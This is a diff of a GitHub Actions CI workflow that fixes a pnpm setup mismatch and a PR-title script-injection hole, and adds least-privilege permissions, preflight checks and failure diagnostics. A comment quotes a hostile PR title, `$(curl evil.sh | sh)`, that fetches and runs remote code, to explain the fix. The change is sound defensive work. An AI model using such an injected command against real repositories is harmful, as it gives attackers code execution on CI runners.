@@ -1,21 +1,82 @@
 # CI (Doc 04 §7): lint & typecheck → tests → build → boundaries, cached by turbo.
 # Security scans (Trivy/CodeQL/gitleaks) and e2e stages are added in P9 per the
 # pipeline spec; Sprint 0 ships the correctness gates.
+#
+# ── THIS FILE HAD NEVER RUN A SINGLE STEP ───────────────────────────────────
+# Three runs exist in the Actions history (2026-07-12, 2026-07-17 ×2) and all
+# three failed identically before the first step:
+#
+#     "The job was not started because your account is locked due to a billing issue."
+#
+# So the pipeline below was never executed, never observed, and — being unrun
+# code — had accumulated the defects unrun code accumulates. Two would have
+# failed the job on its first real execution:
+#
+#   1. `pnpm/action-setup` was passed `version: 10` while package.json declares
+#      `packageManager: "pnpm@10.34.5"`. The action compares the two literally
+#      and THROWS on any difference ("Multiple versions of pnpm specified"),
+#      so the job would have died at setup. The version now comes from
+#      package.json alone — one source of truth, and the exact patch release
+#      the lockfile was written by.
+#
+#   2. A PR title was interpolated straight into a shell command. On a public
+#      repository that is arbitrary code execution on the runner by anyone who
+#      can open a pull request: a title of `$(curl evil.sh | sh)` runs. Titles
+#      now arrive through the environment, where they are data.
+#
+# Everything else here is unchanged in substance — same job, same checks, same
+# order — because the gate itself was right; it simply never got to prove it.
+#
+# ── THE SAME CHECKS, RUNNABLE BY HAND ───────────────────────────────────────
+# `pnpm gate` (root package.json) runs the steps below in this order, so the
+# release gate is one command on a developer machine and not seven remembered
+# ones. That matters more than usual while Actions is blocked: right now a human
+# running `pnpm gate` IS the gate. If you add or reorder a check here, change it
+# there too — they are deliberately the same list, and the only thing keeping
+# them the same is this sentence.
 name: CI
 
 on:
   push:
     branches: [main]
   pull_request:
+  # So the gate can be run on demand against any branch. Without this, a branch
+  # gets no verdict until someone opens a PR, which is the wrong moment to
+  # discover the pipeline is broken.
+  workflow_dispatch:
+
+# Least privilege. This workflow reads the repository and nothing else: it
+# publishes no image, writes no comment, moves no tag. The default token is
+# writable, and a token is only as safe as the scripts that can reach it.
+permissions:
+  contents: read
 
 concurrency:
   group: ci-${{ github.ref }}
-  cancel-in-progress: true
+  # Superseding a PR run saves minutes. Superseding a run on MAIN leaves the
+  # commit that is supposed to be deployable with no verdict at all, which is
+  # the one place the saving is not worth having.
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 jobs:
   ci:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    # MEASURED, not guessed. On a 10-core developer machine the gate costs about
+    # five minutes of compute, of which the integration suite is 3.5 (1363 tests,
+    # deliberately serial — see apps/api/vitest.config.ts). A GitHub-hosted runner
+    # has 4 vCPU, so ~15 minutes is the expectation and this is the headroom.
+    # A timeout that trips on a slow day trains everyone to hit re-run instead of
+    # reading the log, which costs more than the minutes it saves.
+    timeout-minutes: 30
+
+    # One address for each service, shared by the preflight check and the tests
+    # below, so the thing we probe cannot drift from the thing we then use.
+    env:
+      MONGO_TEST_URI: mongodb://127.0.0.1:27017/?directConnection=true
+      REDIS_TEST_URL: redis://127.0.0.1:6379
+      TEST_SMTP_HOST: 127.0.0.1
+      TEST_SMTP_PORT: "1025"
+      MAILHOG_API_URL: http://127.0.0.1:8025
 
     services:
       # NOTE: MongoDB is deliberately NOT a `services:` container — see the
@@ -39,14 +100,30 @@ jobs:
       # ARRIVED in an inbox — a mocked transport would only prove we called
       # nodemailer, which is not a claim anyone cares about. Mailhog needs no
       # credentials and delivers nowhere, so no test can email a real person.
+      #
+      # Pinned, like the other two images. Mailhog is archived upstream, so
+      # `:latest` is a tag that can only ever move underneath us or vanish.
       mailhog:
-        image: mailhog/mailhog:latest
+        image: mailhog/mailhog:v1.0.1
         ports:
           - 1025:1025 # SMTP
           - 8025:8025 # the inbox, over HTTP — this is what the suite reads
 
     steps:
       - uses: actions/checkout@v4
+
+      # Recorded on every run so the question "did we run out of memory?" is
+      # answerable from the log rather than from theory. It is not academic: the
+      # same suite OOM-killed its MongoDB on a developer machine, where Docker had
+      # 7.75 GB shared with 30 other containers. A runner has 16 GB and three.
+      #
+      # Every command is guarded: a step that only reports must never be the
+      # reason a build goes red.
+      - name: Runner capacity
+        run: |
+          nproc | sed 's/^/cpus:   /' || true
+          free -h || true
+          df -h / || true
 
       # MongoDB must be a single-node REPLICA SET, not a standalone: transactions
       # and change streams do not exist without one. A `services:` container cannot
@@ -57,7 +134,10 @@ jobs:
         run: |
           docker run -d --name mongo -p 27017:27017 mongo:7 \
             mongod --replSet rs0 --bind_ip_all
-          for i in $(seq 1 30); do
+          # `_` rather than `i`: the counter is never read, and shellcheck (via
+          # actionlint) is right to say so — a warning left standing is a warning
+          # nobody reads the next time.
+          for _ in $(seq 1 30); do
             docker exec mongo mongosh --quiet --eval 'db.adminCommand({ping:1})' >/dev/null 2>&1 && break
             sleep 1
           done
@@ -66,7 +146,7 @@ jobs:
           # Wait for the primary to be elected — an RS that has not finished electing
           # rejects writes, and the first test would fail for a reason that has
           # nothing to do with the test.
-          for i in $(seq 1 30); do
+          for _ in $(seq 1 30); do
             docker exec mongo mongosh --quiet --eval 'db.hello().isWritablePrimary' | grep -q true && break
             sleep 1
           done
@@ -80,13 +160,17 @@ jobs:
             print("transactions: OK");
           '
 
+      # No `version:` here ON PURPOSE. package.json's `packageManager` field pins
+      # pnpm@10.34.5 — the exact release that wrote pnpm-lock.yaml — and this action
+      # reads it. Naming a version here too is not redundancy: the action throws on
+      # any mismatch, and "10" is a mismatch for "10.34.5".
       - uses: pnpm/action-setup@v4
-        with:
-          version: 10
 
       - uses: actions/setup-node@v4
         with:
-          node-version: 22
+          # From .nvmrc, so a developer and the runner cannot end up on different
+          # majors without someone editing the file that says which one we target.
+          node-version-file: .nvmrc
           cache: pnpm
 
       - name: Install dependencies
@@ -104,18 +188,39 @@ jobs:
       - name: Unit tests
         run: pnpm test
 
+      # The integration harnesses fail loudly when infrastructure is missing (they
+      # must never skip — a skipped tenant-isolation suite looks exactly like a
+      # passing one). But they fail one suite at a time, deep inside a run. This
+      # names the broken service in seconds instead, and distinguishes "the
+      # environment is wrong" from "the code is wrong" — which is the first
+      # question anyone reading a red pipeline has to answer.
+      - name: Preflight — infrastructure is actually reachable
+        run: |
+          docker exec mongo mongosh --quiet --eval 'db.hello().isWritablePrimary' | grep -q true \
+            || { echo "::error::MongoDB is not a writable primary at $MONGO_TEST_URI"; exit 1; }
+
+          # Spoken over a bare socket rather than through a redis-cli we would have
+          # to install or a container we would have to network: bash can open the
+          # connection itself, and RESP is legible enough to answer the only
+          # question being asked.
+          hostport="${REDIS_TEST_URL#redis://}"
+          { exec 3<>"/dev/tcp/${hostport%:*}/${hostport##*:}"; } 2>/dev/null \
+            || { echo "::error::Nothing is listening for Redis at $REDIS_TEST_URL"; exit 1; }
+          printf 'PING\r\n' >&3
+          head -c 7 <&3 | grep -q PONG \
+            || { echo "::error::Redis did not answer PING at $REDIS_TEST_URL"; exit 1; }
+
+          curl -fsS "$MAILHOG_API_URL/api/v2/messages?limit=1" >/dev/null \
+            || { echo "::error::Mailhog inbox is not readable at $MAILHOG_API_URL"; exit 1; }
+
+          echo "mongo / redis / mailhog: all reachable"
+
       # Release-gating (Doc 05 §4.2, RISK_REGISTER T1). Runs against a real MongoDB
       # and a real Redis — these suites fail, never skip, if the infrastructure is
       # unreachable: a silently skipped isolation suite is indistinguishable from a
-      # passing one.
+      # passing one. Addresses come from the job-level `env` above.
       - name: Integration tests (isolation + auth + RBAC matrix + notifications)
         run: pnpm --filter @medicore/api test:int
-        env:
-          MONGO_TEST_URI: mongodb://127.0.0.1:27017/?directConnection=true
-          REDIS_TEST_URL: redis://127.0.0.1:6379
-          TEST_SMTP_HOST: 127.0.0.1
-          TEST_SMTP_PORT: "1025"
-          MAILHOG_API_URL: http://127.0.0.1:8025
 
       - name: Build
         run: pnpm build
@@ -123,6 +228,32 @@ jobs:
       - name: Module boundaries
         run: pnpm boundaries
 
+      # The title arrives as DATA, through the environment. Interpolating
+      # `${{ github.event.pull_request.title }}` into the script instead — as this
+      # step used to — hands the shell to anyone who can open a pull request, and
+      # this repository is public.
+      #
+      # `printf` rather than `echo`: a title beginning with `-n` is a flag to echo
+      # and a string to printf.
       - name: Commitlint (PR title convention)
         if: github.event_name == 'pull_request'
-        run: echo "${{ github.event.pull_request.title }}" | pnpm commitlint
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: printf '%s\n' "$PR_TITLE" | pnpm commitlint
+
+      # A red pipeline whose cause is environmental looks exactly like a red
+      # pipeline whose cause is the diff, and the difference is expensive to guess
+      # at. This is the state you would ask for first if you could log in.
+      - name: Diagnostics (on failure only)
+        if: failure()
+        run: |
+          echo "::group::containers"
+          docker ps -a
+          echo "::endgroup::"
+          echo "::group::mongod log (last 200 lines)"
+          docker logs --tail 200 mongo 2>&1 || true
+          echo "::endgroup::"
+          echo "::group::memory and disk"
+          free -h
+          df -h /
+          echo "::endgroup::"
